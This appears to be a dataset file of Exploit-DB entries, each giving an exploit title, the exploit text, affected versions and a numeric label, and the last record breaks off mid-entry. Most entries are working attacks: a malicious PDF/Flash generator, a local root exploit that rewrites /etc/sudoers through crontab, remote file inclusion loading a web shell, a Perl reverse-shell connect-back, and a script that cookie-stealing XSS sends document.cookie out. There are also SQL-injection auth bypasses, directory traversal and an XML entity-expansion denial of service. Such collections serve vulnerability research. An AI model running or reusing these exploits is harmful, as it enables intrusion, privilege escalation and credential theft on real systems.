15086,"Adobe Acrobat Reader and Flash - 'newfunction' Remote Code Execution '''   __  __  ____         _    _ ____    |  \/  |/ __ \   /\  | |  | |  _ \   | \  / | |  | | /  \ | |  | | |_) |  | |\/| | |  | |/ /\ \| |  | |  _ <   | |  | | |__| / ____ \ |__| | |_) |  |_|  |_|\____/_/    \_\____/|____/   http://www.exploit-db.com/moaub-23-adobe-acrobat-and-reader-newfunction-remote-code-execution-vulnerability/ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/15086.zip (moaub-23-exploit.zip) '''  '''   Title             : Adobe Acrobat Reader and Flash 'newfunction' Remote Code Execution Vulnerability   Version           : Adobe Reader 9.3.2   Analysis          : http://www.abysssec.com   Vendor            : http://www.adobe.com   Impact            : Critical   Contact           : shahin [at] abysssec.com , info  [at] abysssec.com   Twitter           : @abysssec   CVE               : CVE-2010-2168   MOAUB Number      : MOAUB-06 '''  import sys  class PDF:       	def __init__(self): 		self.xrefs = [] 		self.eol = '\x0a' 		self.content = '' 		self.xrefs_offset = 0 		 	def header(self): 		self.content += '%PDF-1.6' + self.eol 		 	def obj(self, obj_num, data,flag): 		self.xrefs.append(len(self.content)) 		self.content += '%d 0 obj' % obj_num 		if flag == 1: 			self.content += self.eol + '<< ' + data + ' >>' + self.eol 		else: 			self.content += self.eol + data + self.eol 		self.content += 'endobj' + self.eol  	def obj_SWFStream(self, obj_num, data, stream): 		self.xrefs.append(len(self.content)) 		self.content += '%d 0 obj' % obj_num 		self.content += self.eol + '<< ' + data + '/Params << /Size %d >> /DL %d /Length %d' %(len(stream),len(stream),len(stream)) 		self.content += ' >>' + self.eol 		self.content += 'stream' + self.eol + stream + self.eol + 'endstream' + self.eol 		self.content += 'endobj' + self.eol 	 	def obj_Stream(self, obj_num, data, stream): 		self.xrefs.append(len(self.content)) 		self.content += '%d 0 obj' % obj_num 		self.content += self.eol + '<< ' + data + '/Length %d' %len(stream) 		self.content += ' >>' + self.eol 		self.content += 'stream' + self.eol + stream + self.eol + 'endstream' + self.eol 		self.content += 'endobj' + self.eol 		 	def ref(self, ref_num): 		return '%d 0 R' % ref_num 		 	def xref(self): 		self.xrefs_offset = len(self.content) 		self.content += 'xref' + self.eol 		self.content += '0 %d' % (len(self.xrefs) + 1) 		self.content += self.eol 		self.content += '0000000000 65535 f' + self.eol 		for i in self.xrefs: 			self.content += '%010d 00000 n' % i 			self.content += self.eol      	def trailer(self): 		self.content += 'trailer' + self.eol 		self.content += '<< /Size %d' % (len(self.xrefs) + 1) 		self.content += ' /Root ' + self.ref(1) + ' >> ' + self.eol 		self.content += 'startxref' + self.eol 		self.content += '%d' % self.xrefs_offset 		self.content += self.eol 		self.content += '%%EOF' 		 	def generate(self): 		return self.content   		 		 class POC:      def getSWF(self):         try:             fdR = open('flash.swf', 'rb+')             strTotal = fdR.read()		             str1 = strTotal[:3673] 			             command = '\x40\xE8\xD4\xF1\xFF\x33'   #newfunction 			             str2 = strTotal[3679:] 			             fdW= open('poc.swf', 'wb+')             finalStr = str1+command+str2             fdW.write(finalStr)	                          fdR.close()             return finalStr                      except IOError:             print '[*] Error : An IO error has occurred' 		  def generate_pdf(): 	poc = POC() 	swfFile = 'poc.swf' 	pdf = PDF() 	pdf.header() 	pdf.obj(1, '/MarkInfo<</Marked true>>/Type /Catalog/Pages ' + pdf.ref(2) ,1) 	pdf.obj(2, '/Count 1/Type/Pages/Kids[ '+pdf.ref(3)+' ]',1) 	pdf.obj(3, '/Annots [ '+pdf.ref(5) +' ]/Parent '+pdf.ref(2) + "" /Type/Page""+' /Contents '+pdf.ref(4) ,1) 	pdf.obj_Stream(4, '','') 	pdf.obj(5, '/RichMediaSettings '+pdf.ref(6)+' /NM ( ' + swfFile + ' ) /Subtype /RichMedia /Type /Annot /RichMediaContent '+pdf.ref(7)+' /Rect [ 266 116 430 204 ]',1) 	pdf.obj(6, '/Subtype /Flash /Activation '+pdf.ref(8)+' /Type /RichMediaSettings /Deactivation '+pdf.ref(9),1)   	pdf.obj(7, '/Type /RichMediaContent /Assets '+pdf.ref(10) +' /Configurations [ ' + pdf.ref(11) + ']',1) 	pdf.obj(8, '/Type /RichMediaActivation /Condition /PO ',1)	 	pdf.obj(9, '/Type /RichMediaDeactivation /Condition /XD ',1)	 	pdf.obj(10, '/Names [('+ swfFile +') ' + pdf.ref(12)+' ]',1)	 	pdf.obj(11, '/Subtype /Flash /Type /RichMediaConfiguration /Name (ElFlash) /Instances [ '+pdf.ref(13) +' ]',1)	 	pdf.obj(12, '/EF <</F '+pdf.ref(14) +' >> /Type /Filespec /F ('+ swfFile +')',1)	 	pdf.obj(13, '/Subype /Flash /Params '+pdf.ref(15) +' /Type /RichMediaInstance /Asset '+ pdf.ref(12) ,1) 	pdf.obj_SWFStream(14, ' /Type /EmbeddedFile  ',poc.getSWF() )   	pdf.obj(15, '/Binding /Background /Type /RichMediaParams /FlashVars () /Settings '+pdf.ref(16),1) 	pdf.obj_Stream(16, '<</Length 0 >> ','')   	 	 	pdf.xref() 	pdf.trailer() 	return pdf.generate() 	 def main(): 	if len(sys.argv) != 2: 		print 'Usage: python %s [output file name]' % sys.argv[0] 		sys.exit(0) 	file_name = sys.argv[1] 	if not file_name.endswith('.pdf'): 		file_name = file_name + '.pdf' 	try: 		fd = open(file_name, 'wb+') 		fd.write(generate_pdf()) 		fd.close() 		print '[-] PDF file generated and written to %s' % file_name 	except IOError: 		print '[*] Error : An IO error has occurred' 		print '[-] Exiting ...' 		sys.exit(-1) if __name__ == '__main__': 	main()",['9.3.2'],1
1185,"Adobe Version Cue 1.0/1.0.1 (OSX) - Local Privilege Escalation #!/usr/bin/perl # # Adobe Version Cue VCNative[OSX]: local root exploit. #  # by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo) #  # Adobe Version Cue's VCNative program writes data to a log file in # the current working directory while running as (setuid) root. the # logfile is formated as <cwd>/VCNative-<pid>.log, which is easily # predictable. you may link this file to any file on the system # and overwrite its contents. use of the ""-host"" option (with # ""-port"") will allow user-supplied data to be injected into the # file. # # This exploit works by overwriting /etc/crontab with # '* * * * * root echo ""ALL ALL=(ALL) ALL"">/etc/sudoers' and # log garbage. within a short period of time crontab will overwrite # /etc/sudoers and ""sudo sh"" to root is possible. this method is used # because direct overwriting of /etc/sudoers will cause sudo to exit # with configuration errors due to the log garbage, whereas crontab # will ignore it. (this exploit requires both cron to be running and # sudo to exist--this is generally default osx)  use POSIX;  $vcn_path=""/Applications/Adobe Version Cue/tomcat/webapps/ROOT/"" . ""WEB-INF/components/com.adobe.bauhaus.nativecomm/res/VCNative""; $vcn_pid=($$ + 1); $vcn_cwd=""/tmp""; $vcn_tempfile=""$vcn_cwd/VCNative-$vcn_pid\.log""; $ovrfile=""/etc/crontab""; $ovrstr=""* * * * * root echo \\\""ALL ALL=(ALL) ALL\\\"">/etc/sudoers"";  sub pexit{print(""[!] @_.\n"");exit(1);} print(""[*] Adobe Version Cue VCNative[OSX]: local root exploit.\n""); print(""[*] by: vade79/v9 v9\@fakehalo.us (fakehalo/realhalo)\n\n""); if(!-f $vcn_path){ pexit(""VCNative binary doesn't appear to exist""); } if(!-f""/etc/crontab""||!-f""/etc/sudoers""){ pexit(""/etc/crontab and /etc/sudoers are required for this to work""); } print(""[*] sym-linking $ovrfile -> $vcn_tempfile.\n""); symlink($ovrfile,$vcn_tempfile)||pexit(""couldn't link files.""); @ast=stat($ovrfile); print(""[*] running VCNative...\n""); system(""\""$vcn_path\"" -cwd $vcn_cwd -port 1 -host \""\n\n$ovrstr\n\n\""""); print(""[*] removing $vcn_tempfile...\n""); unlink($vcn_tempfile); @st=stat($ovrfile); if($st[7]==$ast[7]&&$st[9]==$ast[9]){ pexit(""$ovrfile was not modified, exploit failed""); } else{ print(""[*] $ovrfile was overwritten successfully...\n""); } print(""[*] waiting for crontab to change /etc/sudoers...\n""); @ast=@st=stat(""/etc/sudoers""); while($st[7]==$ast[7]&&$st[9]==$ast[9]){ sleep(1); @ast=stat(""/etc/sudoers""); } print(""[*] /etc/sudoers has been modified.\n""); print(""[*] attempting to \""sudo sh\"". (use YOUR password)\n""); system(""sudo sh""); exit(0);  # milw0rm.com [2005-08-30]",['1.0/1.0.1'],1
43487,"WordPress Plugin WordPress Download Manager 2.9.60 - Cross-Site Request Forgery * Exploit Title: WordPress Download Manager [CSRF] * Discovery Date: 2017-12-12 * Exploit Author: Panagiotis Vagenas * Author Link: https://twitter.com/panVagenas * Vendor Homepage: https://www.wpdownloadmanager.com/ * Software Link: https://wordpress.org/plugins/download-manager * Version: 2.9.60 * Tested on: WordPress 4.9.1 * Category: WebApps, WordPress   Description -----------  Plugin implements the AJAX action `wpdm-install-addon` which calls the function `wpdm_install_addon`. This function doesn't take any anti-CSRF measures thus making it susceptible to those kind of attacks.  What is interesting about this function though, is the fact that it provides plugin installation functionality for admin users. The origin of the package is defined by the `$_REQUEST['addon']` if is set without any validation.  A malicious actor can exploit this to install a malicious plugin in the vulnerable site. In fact the install package doesn't need to be a valid plugin, it could just contain malicious code. Because the package is extracted in the `/wp-content/plugins/` dir without changing it's original folder structure, an attacker could leverage the CSRF to upload malicious code and execute the code on the infected server.  PoC ---  ``` <pre class=""lang:html decode:true ""><form method=""post"" action=""http://vuln.dev/wp-admin/admin-ajax.php"">     <input type=""hidden"" name=""action"" value=""wpdm-install-addon"">     <label> This is the remote url to get plugin from. Everything is valid as long as it's a ZIP archive and ends with .zip         <input type=""text"" name=""addon"" value=""https://downloads.wordpress.org/plugin/bbpress.2.5.13.zip"">     </label>     <button type=""submit"" value=""Submit"">Submit</button> </form>  ```  Solution --------  Update to version 2.9.61.  Timeline --------  1. **2017-12-12**: Discovered 2. **2017-12-14**: Tried to reach out to vendor using support email address 3. **2017-12-16**: Vendor replied 4. **2017-12-16**: Vendor received details 5. **2017-12-21**: Vendor released a fix","['2.9.60', '2.9.61']",1
11624,"MiNBank 1.5.0 - Remote Command Execution #!/usr/bin/perl #################################################################### # MiNBank 1.5.0 Remote Command Execution Exploit # download: http://downloads.sourceforge.net/minbank/ # # Author: Jose Luis Gongora Fernandez 'aka' JosS # mail: sys-project[at]hotmail[dot]com # site: http://www.hack0wn.com/ # team: Spanish Hackers Team - [SHT] # # Hack0wn Security Project!! # # This was written for educational purpose. Use it at your own risk. # Author will be not responsible for any damage. # #################################################################### # # ""need"" allow_url_include = On && register_globals = On # #  Attack vector_RFI!: [/minba/utility/utgn_message.php] #     ... #      require_once(""$minsoft_path/utility/utgn_config.php""); #     ... # #################################################################### # OUTPUT: (tested on localhost) # # [shell]:~$ id #  uid=33(www-data) gid=33(www-data) groups=33(www-data) # [shell]:~$ uname -a #  Linux h4x0rz 2.6.18-6-686 #1 SMP Fri Dec 12 16:48:28 UTC 2008 i686 GNU/Linux # [shell]:~$ exit # h4x0rz:/home/joss/Desktop#   use LWP::UserAgent; use HTTP::Request; use LWP::Simple; use Getopt::Long;  sub clear{ system(($^O eq 'MSWin32') ? 'cls' : 'clear'); }  &clear();  sub banner {         &clear(); 	print ""[x] MiNBank 1.5.0 Remote Command Execution Exploit\n""; 	print ""[x] Written By JosS\n""; 	print ""[x] sys-project[at]hotmail[dot]com\n\n""; 	print ""[+] Usage:\n""; 	print ""[+]     $0 -vuln \""web+path\"" -shell \""shell\""\n""; 	print ""[+] eX: $0 -vuln \""http://www.hack0wn.com/test/\"" -shell \""http://hack0wn.com/desc/c99.txt?\""\n\n"";         exit(); }  my $options = GetOptions (   'help!'            => \$help,    'vuln=s'            => \$vuln,    'shell=s'            => \$shell   );  &banner unless ($vuln); &banner unless ($shell);  &banner if $banner eq 1;  chomp($vuln); chomp($shell);  while (){  	print ""[shell]:~\$ ""; 	chomp($cmd=<STDIN>);  	if ($cmd eq ""exit"" || $cmd eq ""quit"") { 		exit 0; 	}  	my $ua = LWP::UserAgent->new;         $iny=""?&act=cmd&cmd="" . $cmd . ""&d=/&submit=1&cmd_txt=1"";         chomp($iny);         my $own = $vuln . ""/minba/utility/utgn_message.php?minsoft_path="" . $shell . $iny;         chomp($own); 	my $req = HTTP::Request->new(GET => $own); 	my $res = $ua->request($req); 	my $con = $res->content; 	if ($res->is_success){ 		print $1,""\n"" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix); 	}            else              {                 print ""[p0c] Exploit failed\n"";                 exit(1);              } }  # __h0__",['1.5.0'],1
31390,"Chris LaPointe Download Center 1.2 - 'category' Cross-Site Scripting source: https://www.securityfocus.com/bid/28219/info   Download Center is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.   An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   These issues affect Download Center 1.2; other versions may also be vulnerable.   http://www.example.com/downloadcenter/?nav=browse&category=""><script>alert(""xss"")</script>",['1.2'],1
38078,"Elastix - 'page' Cross-Site Scripting source: https://www.securityfocus.com/bid/56746/info  Elastix is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Elastix 2.3.0 is vulnerable; other versions may also be affected.   #! /usr/bin/python # Author cheki # Date 28/11/2012 # Test on Linux(mint) # Vendor Elastix.org # Exploit: https://192.168.2.199/xmlservices/E_book.php?Page=2%3Cscript%3Ealert%28%221%22%29;%3C/script%3E #                     Vulnerability $Page Parameter {E_book.php file} #                     $Page = $_GET['Page'];          // Page index #                     $idx_phone = $_GET['phone'];    // phone's address book index #                     if ( $Page == 0  ) #                     { #                     $Page = 1; #                     }  import smtplib  from email.mime.multipart import MIMEMultipart from email.mime.text import MIMEText me = ""your mail"" target_mail = ""target mail"" msg = MIMEMultipart('alternative') msg['Subject'] = ""Link"" msg['From'] = me msg['To'] = target_mail text = ""Hi!\nHow are you?\nHere is the link you wanted"" html = """"""\ <html>   <head></head>   <body>     <p>Hi!<br>        How are you?<br>        Here is the <a href=""https://192.168.2.199/xmlservices/E_book.php?Page=2%3Cscript%3Ealert%28%221%22%29;%3C/script%3E"">link</a> you wanted.     </p>   </body> </html> """""" part1 = MIMEText(text, 'plain') part2 = MIMEText(html, 'html') msg.attach(part1) msg.attach(part2) s = smtplib.SMTP('localhost') s.sendmail(me, target_mail, msg.as_string()) s.quit()",['2.3.0'],1
1755,"AWStats 6.5 - 'migrate' Remote Shell Command Injection #!/usr/bin/env python # http://secunia.com/advisories/19969/ # by redsand@blacksecurity.org # May 5, 2006 - HAPPY CINCO DE MAYO # HAPPY BIRTHDAY DAD # private plz   # # 	redsand@jinxy ~/ $ nc -l -p 31337 -v #	listening on [any] 31337 ... #	connect to [65.99.197.147] from blacksecurity.org [65.99.197.147] 53377 #	id #	uid=81(apache) gid=81(apache) groups=81(apache) #   import sys, socket, base64 import urllib2, urlparse, urllib  # perl 1 line tcp connect-back code # needs ip & port cmd = 'perl -e \'$h=""%s"";$p=%r;use Socket;$sp=inet_aton($h);$sa=sockaddr_in($p,$sp);;socket(CLIENT,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));gethostbyname($h);connect(CLIENT,$sa);open(STDIN,"">&CLIENT"");open(STDOUT,"">&CLIENT"");open(STDERR,"">&CLIENT"");if(fork()){exec ""/bin/sh""; exit(0); };\'';  class	rbawstatsMigrate: 	__url = ''  	__user = '' 	__password = '' 	__auth = False 	__chost =False 	__cport = False 	 	def	__init__(self,host=False, ur=False, ps=False, chost=False, cport=False): 		if host: 			self.__url = host 		if ur: 			self.__user = ur 		if ps:	 			self.__password = ps  		if ur or ps:	self.__auth = True   		if chost: self.__chost = chost 		if cport: self.__cport = cport   		url = urlparse.urlsplit(self.__url)  		i = url[1].find(';') 		if i >= 0: 			self.__parsed_host = url[1][:i] 		else: 			self.__parsed_host = url[1]  	def	probe(self):  		cphost = socket.gethostbyname_ex(self.__chost)  		my_cmd = cmd % (cphost[2][0],self.__cport) 		url_xpl = { ""config"": self.__parsed_host, 			    ""migrate"":""|cd /tmp/ && %s|awstats052005.%s.txt"" % (my_cmd, self.__parsed_host) 			    # ""migrate"":""|cd /tmp/ && wget %s && chmod 777 %s && /tmp/%s|awstats052005.%s.txt"" % (rsv, fname, fname, self.__parsed_host)  			  }  		#if self.__url[len(self.__url) -1] != '?': 		#	url_xpl = '?' + url_xpl  		url = self.__url  		url_xpl =  urllib.urlencode(url_xpl)  		try: 			req = urllib2.Request(url, url_xpl) 			if(self.__auth): 				b64str = base64.encodestring('%s:%s' % (self.__user,self.__password))[:-1] 				req.add_header('Authorization', ""Basic %s""% b64str)  			req.add_header('Referer', ""http://exploit.by.redsand.of.blacksecurity.org"") 			req.add_header('Accept', 'text/xml,application/xml,application/xhtml+xml,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1') 			req.add_header('Accept-Language','en-us') 			req.add_header('Accept-Encoding','deflate, gzip') 			req.add_header('User-Agent', ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; [BL4CK] Security"") 			req.add_header('Connection' ,'Keep-Alive') 			req.add_header('Cache-Control','no-cache') 			q = urllib2.urlopen(req) 		except IOError, e: 			print ""FAILED %s"" % e 			sys.exit(0)  		print ""SUCCESS, now check to see if it connected-back properly to %s:%s"" % (self.__chost,self.__cport) 		sys.exit(0) 		  		 			 user=False pas=False url=False chst=False cprt=False  print ""[BL4CK] AWStats CMD Injection Exploit by redsand@blacksecurity.org"" print ""http://secunia.com/advisories/19969/"" print ""http://blacksecurity.org - f0r my h0mi3s""  argc = len(sys.argv) if(argc <= 3): 	print ""USAGE: %s http://host/awstats.pl <connect back host> <connect back port> [username] [password] "" % sys.argv[0] 	print ""\t\* Support 401 HTTP Authentication"" 	sys.exit(0) if(argc > 1): 	url = sys.argv[1] if(argc > 2): 	chst = sys.argv[2] if(argc > 3): 	cprt = sys.argv[3] if(argc > 4): 	user = sys.argv[4] if(argc > 5): 	pas = sys.argv[5]     		 red = rbawstatsMigrate(url, user, pas, chst, cprt)  red.probe()  # milw0rm.com [2006-05-06]",['6.5'],1
34907,IBM Tivoli Access Manager for E-Business - '/ivt/ivtserver?parm1' Cross-Site Scripting source: https://www.securityfocus.com/bid/44382/info  IBM Tivoli Access Manager for e-business is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.  IBM Tivoli Access Manager for e-business 6.1.0 is vulnerable.   http://www.example.com/ivt/ivtserver?parm1=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E,['6.1.0'],1
34417,Prado Portal 1.2 - 'page' Cross-Site Scripting source: https://www.securityfocus.com/bid/42276/info  Prado Portal is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Prado Portal 1.2.0 is vulnerable; other versions may also be affected.  http://www.example.com/index.php?page=x<img+src%3Dx+onerror%3Dalert(document.cookie)>,"['1.2', '1.2.0']",0
15961,"TinyBB 1.2 - SQL Injection +-------------------------------+ | TinyBB 1.2 SQLi Vulnerability | +-------------------------------+    Vulnerable Web-App : TinyBB 1.2 Vulnerability      : SQL Injection. Author             : Aodrulez. Email              : f3arm3d3ar@gmail.com Google-Dork        : ""TinyBB 2011 all rights reserved"" Tested on          : Ubuntu 10.04  +---------+ | Exploit | +---------+  TinyBB Version 1.2 is vulnerable to SQLi.  http://127.0.0.1/index.php?page=profile&id=' or 'a'='a   +-------------------+ | Greetz Fly Out To | +-------------------+    1] Amforked()          : My Mentor. 2] The Blue Genius     : My Boss. 3] www.orchidseven.com 4] www.malcon.org",['1.2'],1
42508,"iTech Classifieds Script 7.41 - SQL Injection # # # # # # Exploit Title: iTech Classifieds Script 7.41 - SQL Injection # Dork: N/A # Date: 18.08.2017 # Vendor Homepage : http://itechscripts.com/ # Software Link: http://itechscripts.com/classifieds-script/ # Demo: http://classifieds.itechscripts.com/ # Version: 7.41 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A # # # # # # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Social: @ihsansencan # # # # # # Description: # The vulnerability allows an attacker to inject sql commands.... # # Proof of Concept: # # http://localhost/[PATH]/message.php?pid=[SQL] # -13++UNION+ALL+SELECT+0x31,0x32,0x33,0x34,(sELECT+eXPORT_sET(0x35,@:=0,(sELECT+cOUNT(*)fROM(iNFORMATiON_sCHEMA.cOLUMNS)wHERE@:=eXPORT_sET(0x35,eXPORT_sET(0x35,@,tABLE_nAME,0x3c6c693e,2),cOLUMN_nAME,0xa3a,2)),@,0x32)),0x36,0x37,0x38,0x39,0x3130,0x3131,0x3132,0x3133,0x3134,0x3135,0x3136,0x3137,0x3138,0x3139,0x3230,0x3231,0x3232,0x3233,0x3234,0x3235,0x3236,0x3237,0x3238,0x3239,0x3330,0x3331,0x3332,0x3333,0x3334,0x3335,0x3336,0x3337,0x3338,0x3339,0x3430,0x3431,0x3432,0x3433,0x3434,0x3435,0x3436,0x3437,0x3438,0x3439,0x3530,0x3531,0x3532--+- # # http://localhost/[PATH]/userlistings.php?id=[SQL] # # http://localhost/[PATH]/show_like.php?cid=[SQL] # # Etc... # # # # #",['7.41'],1
21879,"Sun ONE Starter Kit 2.0 / ASTAware SearchDisc 3.1 - Search Engine Directory Traversal source: https://www.securityfocus.com/bid/5828/info  A vulnerability has been reported for the Sun ONE Starter Kit 2.0 and ASTAware SearchDisc. The Starter Kit includes a search engine facility provided for easy information retrieval. The search engine included with the Starter Kit is a modified version of ASTAWare SearchDisc. Reportedly, the search engine is vulnerable to directory traversal attacks.  An attacker can use the information obtained through this manner to launch potentially destructive attacks against a vulnerable system.  This vulnerability affects both the Sun ONE Starter Kit and ASTAware SearchDisc.  http://target:6015/../../../../../ http://target:6016/../../../../../ http://SearchDisk:6017/etc/Password http://SearchDisk:6017/etc/Root",['3.1'],1
8577,"Leap CMS 0.1.4 - SQL Injection / Cross-Site Scripting / Arbitrary File Upload *********************************************************************************************** *********************************************************************************************** **	       										     ** **  											     ** **     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    ** **     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    ** ** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    ** **  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\  **==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>-- **  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/     [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    ** **							                                     ** **    											     ** **                          Â¡VIVA SPAIN!...Â¡GANAREMOS EL MUNDIAL!...o.O                      ** **					Â¡PROUD TO BE SPANISH!				     ** **											     ** *********************************************************************************************** ***********************************************************************************************  ---------------------------------------------------------------------------------------------- |       	   	    	MULTIPLE REMOTE VULNERABILITIES		             	     | |--------------------------------------------------------------------------------------------| |                         	| 	  LEAP CMS 0.1.4       |		 	     | |  CMS INFORMATION:		 ------------------------------			             | |										             | |-->WEB: http://leap.gowondesigns.com/           				             | |-->DOWNLOAD: http://leap.gowondesigns.com/download.php?leap014.zip            	             | |-->DEMO: http://php.opensourcecms.com/scripts/details.php?scriptid=161&name=Leap	     | |-->CATEGORY: CMS / Lite								     | |-->DESCRIPTION: Leap is a single file, template independent, open-source,       	     | |		standards-compliant,extensible content management system for the web...      | |-->RELEASED: 2009-03-13								     | |											     | |  CMS VULNERABILITY:									     | |											     | |-->TESTED ON: firefox 3 and I-Explorer 6						     | |-->DORK: ""Powered by Leap""							             | |-->CATEGORY: AUTH-BYPASS(SQLi)/COOKIE-STEALER (XSS)/SHELL-UPLOAD/ XSS		             | |-->AFFECT VERSION: 0.1.4 (maybe <= ?)				 			     | |-->Discovered Bug date: 2009-04-24							     | |-->Reported Bug date: 2009-04-24							     | |-->Fixed bug date: Not fixed								     | |-->Info patch: Not fixed							             | |-->Author: YEnH4ckEr									     | |-->mail: y3nh4ck3r[at]gmail[dot]com							     | |-->WEB/BLOG: N/A									     | |-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       | |-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     | ----------------------------------------------------------------------------------------------   ############################## //////////////////////////////  AUTHENTICATION BYPASS (SQLi):  ///////////////////////////// ##############################   <<<<---------++++++++++++++ Condition: magic_quotes_gpc=off +++++++++++++++++--------->>>>   ----------- FILE VULN: -----------   Path --> [HOME_PATH]/leap.php   function checkSession() {  	if($_POST['login']=='Login') {  	 		$_SESSION['userMail']=$_POST['email']; $_SESSION['passWord']=md5($_POST['pwd']);  			 		.... 	} 	 	$i=@mysql_query(""SELECT * FROM "".db('prefix').""users WHERE mail='$_SESSION[userMail]' AND pwd='$_SESSION[passWord]'""); $d=@mysql_fetch_array($i);  		....  --------- EXPLOIT: ---------   Email Address: nothing' or 1=1#  Password: nothing   ############################# /////////////////////////////  COOKIES STEALING VULN (XSS):  ///////////////////////////// #############################   <<<<---------++++++++++++++ Condition: Add comment +++++++++++++++++--------->>>>   --------- EXPLOIT: ---------   Go to Link --> http://[HOST]/[HOME_PATH]/?article.[ARTICLE_TITLE]  There it can comment the article.   Add a comment with any name/email and message:   <script>document.location=String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,47,101,120,112,108,111,105,116,45,99,111,111,107,105,101,115,47,119,97,105,116,105,110,103,45,102,111,114,46,112,104,112,63,99,107,61)+document.cookie</script>   PHP Script (Cookies Stealer) --> See: http://www.milw0rm.com/exploits/8453 				      http://www.milw0rm.com/exploits/8471  Note: Exploit fails if real admin click on log-out button.   ############################ ////////////////////////////  SHELL UPLOAD VULNERABILITY:  //////////////////////////// ############################   <<<<---------++++++++++++++ Condition: Be superadmin (above) +++++++++++++++++--------->>>>   --------- EXPLOIT: ---------   Option: Manage Files. Link --> http://[HOST]/[HOME_PATH]/?admin.system.files  upload your shell there.  Then, Go to the link --> http://[HOST]/[HOME_PATH]/shell.php   ######################## ////////////////////////  XSS (SEARCH POST FORM):  //////////////////////// ########################   Search:  ""><script>alert(1)</script>   <<<-----------------------------EOF---------------------------------->>>ENJOY IT!   ####################################################################### ####################################################################### ##*******************************************************************## ## ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ## ##*******************************************************************## ##-------------------------------------------------------------------## ##*******************************************************************## ##       GREETZ TO: JosS and all SPANISH Hack3Rs community!          ## ##*******************************************************************## ####################################################################### #######################################################################  # milw0rm.com [2009-04-30]",['0.1.4'],1
32292,"Ruby 1.9 - REXML Remote Denial of Service source: https://www.securityfocus.com/bid/30802/info  Ruby is prone to a remote denial-of-service vulnerability in its REXML module.  Successful exploits may allow remote attackers to cause denial-of-service conditions in applications that use the vulnerable module.  Versions up to and including Ruby 1.9.0-3 are vulnerable.   #!/usr/bin/env ruby require 'rexml/document'  doc = REXML::Document.new(<<END) <?xml version=""1.0"" encoding=""UTF-8""?> <!DOCTYPE member [   <!ENTITY a ""&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"">   <!ENTITY b ""&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;"">   <!ENTITY c ""&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;"">   <!ENTITY d ""&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;"">   <!ENTITY e ""&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;"">   <!ENTITY f ""&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;"">   <!ENTITY g ""xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx""> ]> <member> &a; </member> END  puts doc.root.text.size","['1.9', '1.9.0-3']",1
25784,"Microsoft Outlook Express 4.x/5.x/6.0 - Attachment Processing File Extension Obfuscation source: https://www.securityfocus.com/bid/13837/info  Microsoft Outlook Express is prone to an attachment file extension obfuscation vulnerability that may present a risk under certain configurations.  The issue manifests due to Microsoft Outlook Express behavior while handling an 'EML' email attachment. If the email attachment does not have a filename, the subject of the attached email message is used as the filename.  Reports indicate that this may be leveraged to make the attached email message executable. It is possible to cause a default file handler to be invoked to process the attached email message. Potentially allowing for code execution.  This issue may lure a victim into a false sense of security and may result in inadvertent or unintentional execution of attacker-supplied code.   ===>>> PoC - Start <<<=== From:""Benjamin Tobias Franz""<0-1-2-3@gmx.de> To:You Subject:MSOE - Attachment Download Security Restriction Bypass Date:Wed, 1 Jun 2005 Content-Type:multipart/mixed;boundary=""btf""  --btf Content-Type: text/plain;  Open the attachment and you will see: MS OE will not show the correct warning message (for software) and not the type of the file.   Regards,  Benjamin Tobias Franz Germany --btf Content-Type:message/rfc822 Content-Transfer-Encoding:quoted-printable  <!-- Subject:BTF's MSOE Attachment Download Security Restriction Bypass= .hta=00.btfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtf= btfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtf= btfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtf= btfbtf --> <title>YOU ARE VULNERABLE</title> <script language=vbscript>set btf=createobject(""wscript.shell"")= :btf.run(""calc"")</script><body 